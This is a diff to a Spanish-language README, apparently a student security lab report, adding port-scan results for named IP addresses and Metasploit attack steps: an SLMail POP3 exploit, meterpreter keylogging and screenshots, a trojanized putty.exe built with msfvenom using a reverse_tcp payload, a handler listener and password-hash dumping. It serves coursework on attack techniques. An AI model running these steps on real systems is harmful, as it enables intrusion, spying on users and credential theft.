@@ -90,4 +90,83 @@ Las ip's seleccionadas fueron:
 
 ![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Ack-prov.png)
 
+## TCP:Inverse
+Las ip's seleccionadas fueron:
+
+88.218.118.10
+![Chale, no cargó la imagen.](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Inverse_88.218.118.10.png)
+
+88.218.118.100 
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Inverse_88.218.118.100.png)
+
+88.218.118.101
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Inverse_88.218.118.101.png)
+
+#### Ejecucion comandos en Kali 
+
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Inverse.png)
+
+## Banner grabbing
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Banner%20ip_windows.png)
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Banner%20ip_windows1.png)
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Banner%20ip_windows2.png)
+
+# Realizando Ataques. 
+## Ataques sin involucrar al usuario. 
+```
+netstat -oan | find "110"
+```
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/evidenciaSmMailPort/Anotaci%C3%B3n%202020-02-28%20072319.png)
+
+```
+msf > use exploit/windows/pop3/seattlelab_pass
+msf exploit(seattlelab_pass) > set rhost <IP_SW_Roja>
+rhost => <IP_SW_Roja>
+msf exploit(seattlelab_pass) > exploit
+```
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/ataque%20sin%20involucrar%20al%20usuario/1.png) 
+```
+meterpreter > keyscan_start
+meterpreter > keyscan_dump 
+``` 
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/ataque%20sin%20involucrar%20al%20usuario/2%20(keyscan).png)
+```
+Captura de pantalla: 
+meterpreter > load espia
+Loading extension espia...success.
+meterpreter > screengrab 
+Screenshot saved to: /root/atdwEeHm.jpeg
+meterpreter > Interrupt: use the 'exit' command to quit
+meterpreter >
+```
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/ataque%20sin%20involucrar%20al%20usuario/3%20(screengrab).png)
+Captura tomada: 
+
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/kBbabPhW.jpeg)
+
+## Ataque involucrando al usuario.
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4443 -x /home/Assiacarmona/Downloads/putty.exe  -k -e x86/shikata_ga_nai -i 15 -f exe > /home/Assiacarmona/deskpot/putty_e.exe
+```
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/Ataque%20involucrando%20al%20usuario/1%20(putty).png)
+```
+#msfconsole
+msf > use exploit/multi/handler 
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp    //salida del comando anterior, no se digita
+msf exploit(handler) > set LHOST <ip_kali>
+LHOST => <ip_kali>
+msf exploit(handler) > set LPORT 4443
+LPORT => 4443
+msf exploit(handler) > exploit
+```
+```
+meterpreter > use priv
+meterpreter > hasdump
+```
+![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/Ataque%20involucrando%20al%20usuario/2%20(getting%20passwords'%20encripted).png)
+
+
+
+
 
